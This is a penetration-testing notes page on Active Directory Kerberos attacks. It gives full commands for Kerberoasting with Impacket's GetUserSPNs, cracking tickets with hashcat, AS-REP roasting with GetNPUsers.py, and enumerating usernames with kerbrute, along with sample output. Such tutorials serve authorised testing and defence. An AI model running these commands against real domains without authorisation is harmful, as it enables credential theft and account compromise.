---
description: >-
  Service Principal Names (SPNs) are a unique identifier tied to each instance
  of a Windows service that can delegate to authenticate using Kerberos
---

# service principle names (SPNs)

They allow a service running on a server to authenticate to client computers on a network. These are used primarily in Active Directory (AD) environments.

An SPN is tied to the logon account of the service, meaning it's possible for a user account to have multiple SPNs if it's running multiple services. If a service or user account has an SPN, then it's possible for that service or account to request a Kerberos ticket. This is where the potential for abuse can occur, and it's the basis for what's known as a Kerberoasting attack.

## Kerberoasting

Kerberoasting is a method where an attacker, even one without a high privilege level, can request Kerberos tickets for any user that has an SPN associated with their account. Since these tickets are encrypted with the user's password, they can then be taken offline and subjected to a brute force attack.

#### Testing for SPNs

To test for SPNs, you can use Impacket's GetUserSPNs tool. The tool allows you to request and export SPNs associated with a user account for offline cracking.&#x20;

```bash
impacket-GetUserSPNs -dc-ip 10.199.101.5 <domain>.local/<user>
impacket-GetUserSPNs -request -dc-ip 192.168.95.11 <domain>.local/<user>
```

Replace `<domain>.local` with the Fully Qualified Domain Name (FQDN) of your target, and `<user>` with the username you're interested in. The `-dc-ip` parameter specifies the IP address of the domain controller you're targeting.

Once you've gathered the SPNs, you can then attempt to crack the passwords offline using a tool like Hashcat. Here's an example of how to use Hashcat for this:

```bash
hashcat -m 13100 hashes.txt /mnt/hgfs/Host_Desktop/ -o cracked.txt
```

In this example, `-m 13100` specifies the mode (in this case, Kerberos 5 TGS-REP etype 23), `hashes.txt` is the file containing the SPN hashes you've exported, and `-o cracked.txt` is the output file for any cracked passwords.

## ASREPRoasting

If you do not have valid domain credentials, you can look to check if any of the users you do currently have, if the account has "Does not require pre-authentication" enabled, allowing for ASREPRoasting. You can use `GetNPUsers.py` from `Impacket`

```
python3 GetNPUsers.py <domain>/<username> -dc-ip <domain-controller-ip> -request
```

If the target user has "Does not require Kerberos pre-authentication" enabled, you will receive an AS-REP hash that can be cracked offline.

### Install on Kali

`GetNPUsers.py` is not included in Kali Linux by default. However, it is part of the `Impacket` suite, which you can install on Kali. Here’s how to set it up:

#### 1. **Install Impacket**

*   If you haven't already, clone the Impacket repository:

    {% code overflow="wrap" %}
    ```bash
    git clone https://github.com/SecureAuthCorp/impacket.git
    ```
    {% endcode %}
*   Navigate to the Impacket directory:

    ```bash
    cd impacket
    ```
*   Install Impacket:

    ```
    sudo python3 -m pip install .
    ```

{% code overflow="wrap" %}
```bash
python3 examples/GetNPUsers.py <domain>/<username> -dc-ip <domain-controller-ip> -request
```
{% endcode %}

## Kerbrute

Iff you do not have valid domain credentials to try the above, you can bruteforce attempts to request a Ticket GRanting Ticket (TGT) from the domain controller for each username in a provided list.

When a valid username is found, the domain controller responds differently compared to when the username does not exist. This response can confirm the validity of a username.

{% code overflow="wrap" %}
```bash
./kerbrute userenum --dc <domain-controller-ip> -d <domain> <userlist.txt>
```
{% endcode %}

It is not installed in kali though so you can get it by doing the following:

{% code overflow="wrap" %}
```bash
sudo apt update
sudo apt install golang-go
git clone https://github.com/ropnop/kerbrute.git
cd kerbrute
go build
```
{% endcode %}

Valid users will look like this:

```

    __             __               __
   / /_____  _____/ /_  _______  __/ /____
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/

Version: dev (n/a) - 10/09/24 - Ronnie Flathers @ropnop

2024/10/09 09:13:28 >  Using KDC(s):
2024/10/09 09:13:28 >   10.24.1.20:88

2024/10/09 09:13:30 >  [+] VALID USERNAME:       gemma@acmecorp
2024/10/09 09:13:33 >  Done! Tested 10279 usernames (1 valid) in 5.110 seconds
```

In this instance, a single user was found called "gemma"

